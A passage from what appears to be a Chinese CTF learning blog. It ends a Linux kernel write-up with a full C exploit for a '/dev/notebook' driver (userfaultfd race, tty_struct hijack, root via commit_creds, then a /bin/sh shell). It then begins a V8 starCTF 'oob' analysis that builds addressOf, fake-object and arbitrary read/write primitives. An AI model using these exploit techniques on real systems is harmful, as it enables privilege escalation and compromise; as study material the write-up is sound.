commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。\n所以这里只需要用到两个堆块，第一个堆块我们要形成一个size为0x2e0的UAF堆块，第二个堆块没有要求。使用堆喷让tty_struct喷到我们的UAF堆块，但是我们需要确认他是否成功了，在tty_struct的第一个成员是一个魔数，我们可以利用他进行判断。随后修改tty_operations指针指向另外一个堆块，紧接着根据上面的函数中的偏移修改tty_struct的内容即可\n综上，得出exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;int fd;struct userarg&#123;    long int idx;    long int size;    unsigned long *buf;&#125;;void ErrExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void RegisterUserfault(void *fault_page, void *handler)&#123;    pthread_t thr;    struct uffdio_api ua;    struct uffdio_register ur;    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);    ua.api = UFFD_API;    ua.features = 0;    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);    ur.range.start = (unsigned long)fault_page; //我们要监视的区域    ur.range.len = 0x1000;    ur.mode = UFFDIO_REGISTER_MODE_MISSING;    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);    //开一个线程，接收错误的信号，然后处理    int s = pthread_create(&amp;thr, NULL, handler, (void *)uffd);    if (s != 0)        ErrExit(&quot;[-] pthread_create&quot;);&#125;void *userfaultfd_stuck_handler(void *arg)&#123;    struct uffd_msg msg;    unsigned long uffd = (unsigned long)arg;    puts(&quot;[+] stuck handler created&quot;);    int nready;    struct pollfd pollfd;    pollfd.fd = uffd;    pollfd.events = POLLIN;    nready = poll(&amp;pollfd, 1, -1);    puts(&quot;[+] stuck handler unblocked&quot;);    pause();    if (nready != 1)    &#123;        ErrExit(&quot;[-] Wrong poll return val&quot;);    &#125;    nready = read(uffd, &amp;msg, sizeof(msg));    if (nready &lt;= 0)    &#123;        ErrExit(&quot;[-] msg err&quot;);    &#125;    char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    if (page == MAP_FAILED)    &#123;        ErrExit(&quot;[-] mmap err&quot;);    &#125;    struct uffdio_copy uc;    // init page    memset(page, 0, sizeof(page));    uc.src = (unsigned long)page;    uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(0x1000 - 1);    uc.len = 0x1000;    uc.mode = 0;    uc.copy = 0;    ioctl(uffd, UFFDIO_COPY, &amp;uc);    puts(&quot;[+] stuck handler done&quot;);    return NULL;&#125;void create(long int idx, long int size, unsigned long *buf)&#123;    struct userarg arg;    arg.idx = idx;    arg.size = size;    arg.buf = buf;    ioctl(fd, 0x100, &amp;arg);&#125;void delete (long int idx)&#123;    struct userarg arg;    arg.idx = idx;    ioctl(fd, 0x200, &amp;arg);&#125;void edit(long int idx, long int size, unsigned long *buf)&#123;    struct userarg arg;    arg.idx = idx;    arg.size = size;    arg.buf = buf;    ioctl(fd, 0x300, &amp;arg);&#125;void get_chunk(unsigned long *buf)&#123;    struct userarg arg;    arg.buf = buf;    ioctl(fd, 0x64, &amp;arg);&#125;unsigned long *stuck_mapped_memory;void edit_thread(long int idx)&#123;    edit(idx, 0, stuck_mapped_memory);&#125;void add_thread(long int idx)&#123;    create(idx, 0x60, stuck_mapped_memory);&#125;int tty_fd;int main()&#123;    fd = open(&quot;/dev/notebook&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[-] Error opening /dev/notebook\\n&quot;);        exit(-1);    &#125;    stuck_mapped_memory = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);    char *buf;    char *buf_tty;    buf = malloc(0x1000);    buf_tty = malloc(0x1000);    memset(buf, &quot;a&quot;, 0x100);    memset(buf_tty, 0, 0x1000);    create(0, 0x60, buf);    create(1, 0x60, buf);    edit(1, 0x500, buf);    edit(0, 0x2e0, buf);    pthread_t thr_edit, thr_add;    pthread_create(&amp;thr_edit, NULL, edit_thread, 0);    sleep(1);    pthread_create(&amp;thr_add, NULL, add_thread, 0);    sleep(1);    for (int i = 0; i &lt; 20; i++)    &#123;        tty_fd = open(&quot;/dev/ptmx&quot;, O_RDWR);        if (tty_fd &lt; 0)        &#123;            ErrExit(&quot;[-] ptmx open failed!&quot;);        &#125;        read(fd, buf_tty, 0);        if (*(unsigned long *)buf_tty == 0x100005401)        &#123;            printf(&quot;[+] tty_struct found! fd = %d\\n&quot;, tty_fd);            break;        &#125;    &#125;    if (*(unsigned long *)buf_tty != 0x100005401)    &#123;        ErrExit(&quot;[-] leak failed&quot;);    &#125;    unsigned long kernel_base;    unsigned long ptm_unix98_ops_addr;    unsigned long work_for_cpu_fn_addr;    unsigned long commit_creds_addr;    unsigned long prepare_kernel_cred_addr;    ptm_unix98_ops_addr = *(unsigned long *)(buf_tty + 0x18);    if ((ptm_unix98_ops_addr &amp; 0xFFF) == 0x320)        ptm_unix98_ops_addr += 0x120;    kernel_base = ptm_unix98_ops_addr - 0xe8e440;    work_for_cpu_fn_addr = 0x9eb90 + kernel_base;    commit_creds_addr = 0xa9b40 + kernel_base;    prepare_kernel_cred_addr = 0xa9ef0 + kernel_base;    printf(&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\\n&quot;, ptm_unix98_ops_addr);    printf(&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\\n&quot;, work_for_cpu_fn_addr);    printf(&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\\n&quot;, prepare_kernel_cred_addr);    unsigned long chunk_arr[0x100];    get_chunk(chunk_arr);    unsigned long note_0_addr;    unsigned long note_1_addr;    note_0_addr = chunk_arr[0 * 2];    note_1_addr = chunk_arr[1 * 2];    printf(&quot;[+] note_1 addr leaked, addr: 0x%lx\\n&quot;, note_1_addr);    *(unsigned long *)(buf_tty) = 0x100005401;    *(unsigned long *)(buf_tty + 3 * 8) = note_1_addr;    *(unsigned long *)(buf_tty + 4 * 8) = prepare_kernel_cred_addr;    *(unsigned long *)(buf_tty + 5 * 8) = 0;    write(fd, buf_tty, 0);    unsigned long fake_operations[0x100];    fake_operations[7] = work_for_cpu_fn_addr;    fake_operations[10] = work_for_cpu_fn_addr;    fake_operations[12] = work_for_cpu_fn_addr;    write(fd, fake_operations, 1);    ioctl(tty_fd, 233, 233);    read(fd, buf_tty, 0);    printf(&quot;[+] prepare_kernel_cred finished, return 0x%lx\\n&quot;, *(unsigned long *)(buf_tty + 6 * 8));    *(unsigned long *)(buf_tty) = 0x100005401;    *(unsigned long *)(buf_tty + 3 * 8) = note_1_addr;    *(unsigned long *)(buf_tty + 4 * 8) = commit_creds_addr;    *(unsigned long *)(buf_tty + 5 * 8) = *(unsigned long *)(buf_tty + 6 * 8);    write(fd, buf_tty, 0);    sleep(1);    ioctl(tty_fd, 233, 233);    system(&quot;/bin/sh&quot;);    return 0;&#125;\n\n\n\n参考链接：https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#_1\n","categories":["Linux Kernel"],"tags":["userfaultfd","tty_struct"]},{"title":"v8初体验","url":"/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/","content":"前言这段事情因为各种事情耽搁，一直没有更新文章。本打算新的一篇出rootkit来水一篇，后面发现a3佬写的太多了，不想继续看了。然后前阵子一直在思考后续到底是学什么方向，在docker逃逸、chrome内核、iot还有fuzz之间犹豫不决，现在也算是下定决心来学学chrome了，只希望能够快点搞完，后面还是打算更多的去学习docker逃逸。\n这里就不提环境安装的事情了，网上有很多相关资料。\n基础知识js作为一个面向对象编程的语言，他的变量都是以类的形式表现的。并且js作为动态语言，他的类成员是可以改变的，这也就导致他在内存中的存在形式相交与C语言要复杂的多。\n使用如下程序进行调试：\nvar int_arr = [1, 2, 3];var float_arr = [1.1, 1.2, 1.3];var obj = &#123;&quot;a&quot; : 1&#125;;var object_arr = [obj, obj, obj];var newed_arr = new Array(3);%DebugPrint(int_arr);%SystemBreak();%DebugPrint(float_arr);%SystemBreak();%DebugPrint(object_arr);%SystemBreak();%DebugPrint(newed_arr);%SystemBreak();\n\n上面的%DebugPrint(int_arr)的作用是打印出int_arr的内存信息，也就是打印出内存地址。后面的%SystemBreak()函数则是将控制权交给gdb。\n0x011117f8df01 &lt;JSArray[3]&gt;... ...pwndbg&gt; job 0x011117f8df010x11117f8df01: [JSArray] - map: 0x07bd46242d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt; - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)] - length: 3 - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; &#123;           0: 1           1: 2           2: 3 &#125; pwndbg&gt; telescope 0x011117f8df01-100:0000│  0x11117f8df00 —▸ 0x7bd46242d99 ◂— 0x40000020b620c0101:0008│  0x11117f8df08 —▸ 0x20b620c0c71 ◂— 0x20b620c0802:0010│  0x11117f8df10 —▸ 0x11117f8de19 ◂— 0x20b620c0803:0018│  0x11117f8df18 ◂— 0x30000000004:0020│  0x11117f8df20 —▸ 0x20b620c14f9 ◂— 0x20b620c0105:0028│  0x11117f8df28 ◂— 0x30000000006:0030│  0x11117f8df30 ◂— 0x3ff199999999999a07:0038│  0x11117f8df38 ◂— 0x3ff3333333333333pwndbg&gt; telescope 0x011117f8de19-100:0000│  0x11117f8de18 —▸ 0x20b620c0851 ◂— 0x20b620c0101:0008│  0x11117f8de20 ◂— 0x30000000002:0010│  0x11117f8de28 ◂— 0x10000000003:0018│  0x11117f8de30 ◂— 0x20000000004:0020│  0x11117f8de38 ◂— 0x30000000005:0028│  0x11117f8de40 —▸ 0x20b620c0801 ◂— 0x20b620c0106:0030│  0x11117f8de48 ◂— 0x30000000007:0038│  0x11117f8de50 —▸ 0xeff64df451 ◂— 0x9a0000020b620c05\n\n从上面可以看到，这里打印出来的是一个int类型的数组，在使用job命令可以清晰的看到这块内存的数据结构。首先是一个指向map的指针，随后在job显示的和telescope出来的内容有一定出入，这里我选择相信telescope，所以第二个成员应该是properties，随后就是elements指针，最后就是length。可以看出来elements指针就是真正指向数据的指针，并且在后面紧跟了elements内存区域的结构。\nstarCTF oob漏洞分析diff --git a/src/bootstrapper.cc b/src/bootstrapper.ccindex b027d36..ef1002f 100644--- a/src/bootstrapper.cc+++ b/src/bootstrapper.cc@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,                           Builtins::kArrayPrototypeCopyWithin, 2, false);     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,                           Builtins::kArrayPrototypeFill, 1, false);+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,+                          Builtins::kArrayOob,2,false);     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,                           Builtins::kArrayPrototypeFind, 1, false);     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.ccindex 8df340e..9b828ab 100644--- a/src/builtins/builtins-array.cc+++ b/src/builtins/builtins-array.cc@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,   return *final_length; &#125; &#125;  // namespace+BUILTIN(ArrayOob)&#123;+    uint32_t len = args.length();+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();+    Handle&lt;JSReceiver&gt; receiver;+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+            isolate, receiver, Object::ToObject(isolate, args.receiver()));+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());+    if(len == 1)&#123;+        //read+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));+    &#125;else&#123;+        //write+        Handle&lt;Object&gt; value;+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+        elements.set(length,value-&gt;Number());+        return ReadOnlyRoots(isolate).undefined_value();+    &#125;+&#125;  BUILTIN(ArrayPush) &#123;   HandleScope scope(isolate);diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.hindex 0447230..f113a81 100644--- a/src/builtins/builtins-definitions.h+++ b/src/builtins/builtins-definitions.h@@ -368,6 +368,7 @@ namespace internal &#123;   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \\   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \\   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \\+  CPP(ArrayOob)                                                                \\                                                                                \\   /* ArrayBuffer */                                                            \\   /* ES #sec-arraybuffer-constructor */                                        \\diff --git a/src/compiler/typer.cc b/src/compiler/typer.ccindex ed1e4a5..c199e3a 100644--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;       return Type::Receiver();     case Builtins::kArrayUnshift:       return t-&gt;cache_-&gt;kPositiveSafeInteger;+    case Builtins::kArrayOob:+      return Type::Receiver();      // ArrayBuffer functions.     case Builtins::kArrayBufferIsView:\n\n整个题目就只有这样一个diff文件，这里主要需要注意的是中间那一块+号区域，在周围只是为了能够正常进行编译才添加的。\n可以看到添加的这个函数在一开始就对参数的数量进行了判断，如果参数数量大于2则返回undefined，随后接受第一个到receiver中，进一步得到JSArray结构的变量array，紧接着通过array变量取出对应的elements，并且在最后拿到了数组的长度。\n然后函数又进行判断，如果参数的数量为1则返回数组末尾的后一个地址的值，也就出现了越界读取的漏洞。\n如果参数的数量为2则获取第二个参数到value中，然后写到数组末尾的后一个地址，也就出现了越界写的漏洞。\n需要注意的是，这里函数参数的第一个参数默认为this，所以 test_arr.oob() 的含义为一个参数\n小总结其实通过前面的基础知识章节和这里的漏洞分析之后可以很容易的看出来，在操作数组中的内容时都是这样一层一层找下去的。\n而在js中对于数组中不是只能存放整型的变量，还可以存放各种类型的对象，而如何区分数组中变量类型就需要用到JSArray中的map成员进行区分。所以如果我们可以修改map成员即可实现类型混淆。\n利用分析虽然是找到了漏洞点，并且也知道了存在类型混淆的可能性，但根据目前的情况仍无法继续操作。因为可以看到前面我们在看elements结构中并没有看到map，也就无利用之谈了。\npwndbg&gt; job 0x011117f8df490x11117f8df49: [JSArray] - map: 0x07bd46242ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt; - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS] - length: 3 - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; &#123;           0: 1.1           1: 1.2           2: 1.3 &#125; pwndbg&gt; telescope 0x011117f8df49-100:0000│  0x11117f8df48 —▸ 0x7bd46242ed9 ◂— 0x40000020b620c0101:0008│  0x11117f8df50 —▸ 0x20b620c0c71 ◂— 0x20b620c0802:0010│  0x11117f8df58 —▸ 0x11117f8df21 ◂— 0x20b620c1403:0018│  0x11117f8df60 ◂— 0x30000000004:0020│  0x11117f8df68 —▸ 0x7bd4624ab39 ◂— 0x40000020b620c0105:0028│  0x11117f8df70 —▸ 0x20b620c0c71 ◂— 0x20b620c0806:0030│  0x11117f8df78 —▸ 0x20b620c0c71 ◂— 0x20b620c0807:0038│  0x11117f8df80 ◂— 0x100000000pwndbg&gt; telescope 0x011117f8df21-100:0000│  0x11117f8df20 —▸ 0x20b620c14f9 ◂— 0x20b620c0101:0008│  0x11117f8df28 ◂— 0x30000000002:0010│  0x11117f8df30 ◂— 0x3ff199999999999a03:0018│  0x11117f8df38 ◂— 0x3ff333333333333304:0020│  0x11117f8df40 ◂— 0x3ff4cccccccccccd05:0028│  0x11117f8df48 —▸ 0x7bd46242ed9 ◂— 0x40000020b620c0106:0030│  0x11117f8df50 —▸ 0x20b620c0c71 ◂— 0x20b620c0807:0038│  0x11117f8df58 —▸ 0x11117f8df21 ◂— 0x20b620c14\n\n但是在后续看浮点数中可以看到map的地址紧邻者elements的数据。\npwndbg&gt; job 0x011117f8dfe10x11117f8dfe1: [JSArray] - map: 0x07bd46242f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties] - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt; - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS] - length: 3 - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; &#123;         0-2: 0x011117f8df69 &lt;Object map = 0x7bd4624ab39&gt; &#125; pwndbg&gt; telescope 0x011117f8dfe1-1 2000:0000│  0x11117f8dfe0 —▸ 0x7bd46242f79 ◂— 0x40000020b620c0101:0008│  0x11117f8dfe8 —▸ 0x20b620c0c71 ◂— 0x20b620c0802:0010│  0x11117f8dff0 —▸ 0x11117f8dfb9 ◂— 0x20b620c0803:0018│  0x11117f8dff8 ◂— 0x30000000004:0020│  0x11117f8e000 —▸ 0x7bd46242e89 ◂— 0x40000020b620c0105:0028│  0x11117f8e008 —▸ 0x20b620c0c71 ◂— 0x20b620c0806:0030│  0x11117f8e010 —▸ 0x11117f8e031 ◂— 0x20b620c0807:0038│  0x11117f8e018 ◂— 0x300000000pwndbg&gt; telescope 0x011117f8dfb9-100:0000│  0x11117f8dfb8 —▸ 0x20b620c0801 ◂— 0x20b620c0101:0008│  0x11117f8dfc0 ◂— 0x30000000002:0010│  0x11117f8dfc8 —▸ 0x11117f8df69 ◂— 0x71000007bd4624ab... ↓     2 skipped05:0028│  0x11117f8dfe0 —▸ 0x7bd46242f79 ◂— 0x40000020b620c0106:0030│  0x11117f8dfe8 —▸ 0x20b620c0c71 ◂— 0x20b620c0807:0038│  0x11117f8dff0 —▸ 0x11117f8dfb9 ◂— 0x20b620c08\n\n同样的，我们在数组中全是对象的时候也可以看到map的地址紧邻着这些数据。\n注意那个地址的最后，它的值看起来不是对齐的。这是因为v8里有个tagged pointer机制，一个地址指向的如果不是SMI（就是小整数)，它的最低位就会打上一个标记，就会有个1，看起来就不是对齐的，用的时候要减1。\n接着需要思考的事，一个越界读写能给我造成什么样的效果呢？\n1. 泄漏map地址这里泄漏map地址就很简单，在数组中的成员为对象和浮点型的时候直接调用oob函数即可获取到。\nvar obj = &#123; &quot;a&quot;: 1 &#125;;var obj_array = [obj];var flt_array = [1.1];var obj_array_map = obj_array.oob();var float_array_map = float_array.oob();\n\n2. 类型混淆获取任意对象地址function addressOf(leak_obj) &#123;  obj_array[0] = leak_obj;  obj_array.oob(flt_array_map);  var res = obj_array[0];  obj_array.oob(obj_array_map);  return f2i(res);&#125;\n\n这里的实现原理也是非常简单，首先就是将需要获取地址的对象放到obj_array中，随后使用oob函数将flt_array_map的地址写进去，这时再去访问obj_array中的成员时就会以float的形式返回出对应的地址了，最后在恢复类型即可。\n3. 讲任意地址当作对象function fake_object(address) &#123;  flt_array[0] = i2f(address);  flt_array.oob(obj_array_map);  var fake_obj = flt_array[0];  flt_array.oob(flt_array_map);  return fake_obj;&#125;\n\n其实道理和上一步类似。\n4. 实现任意地址读取var arb_rw_arr = [flt_array_map, 1.2, 1.3, 1.4];var fake_obj = fake_object(address_of(arb_rw_arr) - 0x20n);function arbitrary_read(address) &#123;  arb_rw_arr[2] = i2f(address - 0x10n + 0x1n)  return f2i(fake_obj[0]);&#125; \n\n首先这里是吧arb_rw_arr这个数组的elements区域当作的是一个JSArray结构体，而这个结构对应的指针为fake_obj。\n这里主要解释一下第二行代码调用函数的部分，这里首先是拿到arb_rw_arr对象的地址，随后减去0x20则是因为JSArray和elements相距固定偏移为0x30，这里减去0x20的话代表将elements + 0x10当做了fake JSArray，根据前面的调试得知在elements + 0x10的位置开始为数组中数据的部分，所以我们现在是可以实现任意修改fake_obj的JSArray部分。\n然后就是这里返回的fake_obj对象，这个对象实质指向的是就是arb_rw_arr的elements + 0x10的位置。\n又因为可以任意修改这一部分的内容，所以我们可以修改elements指针，使其指向任意地址配合fake_obj对象即可达到任意地址读取的效果。\n5. 实现任意地址写var buffer = new ArrayBuffer(16);var data_view = new DataView(buffer);var buf_backing_store_addr = address_of(buffer) - 1n + 0x20n;function arbitrary_write(address, value) &#123;  arb_rw_arr[2] = i2f(buf_backing_store_addr - 0x10n + 0x1n);  fake_obj[0] = address;  data_view.setFloat64(value);&#125;\n\n任意地址写的写法在一开始的想法肯定是和任意地址读一致。不过按照上面那样写会出现一个段错误，这是简单的write FloatArray对浮点数的处理方式造成的，当值以 0x7f 开头等高处的地址都会出现这种问题。为了避免选择使用DataView来处理。\nDataView对象偏移+0x20处，存有一个backing_store指针，该指针指向真正存储数据的地址，改写这个指针即可任意读写。\n最终利用: 传统方式传统的方式是对__free_hook进行劫持。但是它在libc中，所以首先还是需要考虑泄漏出程序基地址，然后通过got表泄漏出libc地址。\n不过目前遇到的是如何泄漏出程序基地址\npwndbg&gt; job 0x0fcdcb2c2d990xfcdcb2c2d99: [Map] - type: JS_ARRAY_TYPE - instance size: 32 - inobject properties: 0 - elements kind: PACKED_SMI_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x046dfe5804d1 &lt;undefined&gt; - prototype_validity cell: 0x1bc536f80609 &lt;Cell value= 1&gt; - instance descriptors (own) #1: 0x08ad62ed1f49 &lt;DescriptorArray[1]&gt; - layout descriptor: (nil) - transitions #1: 0x08ad62ed1e59 &lt;TransitionArray[4]&gt;Transition array #1:     0x046dfe584ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x0fcdcb2c2e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; - prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt; - constructor: 0x08ad62ed0ec1 &lt;JSFunction Array (sfi = 0x1bc536f86791)&gt; - dependent code: 0x046dfe5802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0\n\n这里随便查看一个JSArray内部的map，可以看到其中包含这constructor\npwndbg&gt; job 0x08ad62ed0ec10x8ad62ed0ec1: [Function] in OldSpace - map: 0x0fcdcb2c2d49 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x08ad62ec2109 &lt;JSFunction (sfi = 0x1bc536f83b29)&gt; - elements: 0x046dfe580c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - function prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt; - initial_map: 0x0fcdcb2c2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; - shared_info: 0x1bc536f86791 &lt;SharedFunctionInfo Array&gt; - name: 0x046dfe583599 &lt;String[#5]: Array&gt; - builtin: ArrayConstructor - formal_parameter_count: 65535 - kind: NormalFunction - context: 0x08ad62ec1869 &lt;NativeContext[246]&gt; - code: 0x3eadb8bc6981 &lt;Code BUILTIN ArrayConstructor&gt; - properties: 0x08ad62ed1029 &lt;PropertyArray[6]&gt; &#123;    #length: 0x1bc536f804b9 &lt;AccessorInfo&gt; (const accessor descriptor)    #name: 0x1bc536f80449 &lt;AccessorInfo&gt; (const accessor descriptor)    #prototype: 0x1bc536f80529 &lt;AccessorInfo&gt; (const accessor descriptor)    0x046dfe584c79 &lt;Symbol: (native_context_index_symbol)&gt;: 11 (const data field 0) properties[0]    0x046dfe584f41 &lt;Symbol: Symbol.species&gt;: 0x08ad62ed0fd9 &lt;AccessorPair&gt; (const accessor descriptor)    #isArray: 0x08ad62ed1069 &lt;JSFunction isArray (sfi = 0x1bc536f86829)&gt; (const data field 1) properties[1]    #from: 0x08ad62ed10a1 &lt;JSFunction from (sfi = 0x1bc536f86879)&gt; (const data field 2) properties[2]    #of: 0x08ad62ed10d9 &lt;JSFunction of (sfi = 0x1bc536f868b1)&gt; (const data field 3) properties[3] &#125;\n\n继续跟进constructor可以看到有一个成员为code\npwndbg&gt; x/20xg 0x3eadb8bc6981-10x3eadb8bc6980:\t0x0000046dfe580a31\t0x0000046dfe582c010x3eadb8bc6990:\t0x0000046dfe580c71\t0x0000046dfe5827910x3eadb8bc69a0:\t0x00001bc536f916a9\t0x800001c60000000d0x3eadb8bc69b0:\t0x000000240000001c\t0x000000a6000000240x3eadb8bc69c0:\t0x55a5afef9780ba49\t0x000000e2ff4100000x3eadb8bc69d0:\t0x0000000000000000\t0x00000000000000000x3eadb8bc69e0:\t0x0000046dfe580a31\t0x0000046dfe582c010x3eadb8bc69f0:\t0x0000046dfe580c71\t0x0000046dfe5827910x3eadb8bc6a00:\t0x00001bc536f916c1\t0x800001c60000000d0x3eadb8bc6a10:\t0x0000019f00000188\t0x000000a70000019f\n\n在内部可以看到在距离开始位置为0x40的位置就能看到心心念念的程序基地址，所以直接通过这里泄漏即可。\n泄漏完基地址就很好办，后续就是通过got表泄漏libc地址，然后劫持__free_hook即可为system，然后创建一个函数中申请变量为想要执行的命令。\n\n  我这里没看过源码，不过我猜测是因为js是动态变量的缘故，js的变量都是以堆的形式存在的，并且在函数执行结束后会释放掉内存。\n\n最终利用: 非传统方式这种方法则是往程序中写shellcode，但是程序自身并没有rwx的段。不过存在这样一种技术wasm，使用 这个网站 可以生成一段wasm码，可以用生成一个函数对象：\nvar wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);var f = wasmInstance.exports.main;\n\n\nvar wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);var f = wasmInstance.exports.main;console.log(f());% DebugPrint(f);% SystemBreak();\n\n\n当我们运行可以看到确实是返回了42。\npwndbg&gt; job 0x365390d5faf90x365390d5faf9: [Function] in OldSpace - map: 0x309e6c9c4379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x365390d42109 &lt;JSFunction (sfi = 0x2a087603b29)&gt; - elements: 0x2754f1600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - function prototype: &lt;no-prototype-slot&gt; - shared_info: 0x365390d5fac1 &lt;SharedFunctionInfo 0&gt; - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt; - formal_parameter_count: 0 - kind: NormalFunction - context: 0x365390d41869 &lt;NativeContext[246]&gt; - code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt; - WASM instance 0x365390d5f901 - WASM function index 0 - properties: 0x2754f1600c71 &lt;FixedArray[0]&gt; &#123;    #length: 0x02a0876004b9 &lt;AccessorInfo&gt; (const accessor descriptor)    #name: 0x02a087600449 &lt;AccessorInfo&gt; (const accessor descriptor)    #arguments: 0x02a087600369 &lt;AccessorInfo&gt; (const accessor descriptor)    #caller: 0x02a0876003d9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125;\n\n查看一下这个 f ，可以看到他的类型为JSFunction，继续跟进其中的share_info。\npwndbg&gt; job 0x365390d5fac10x365390d5fac1: [SharedFunctionInfo] in OldSpace - map: 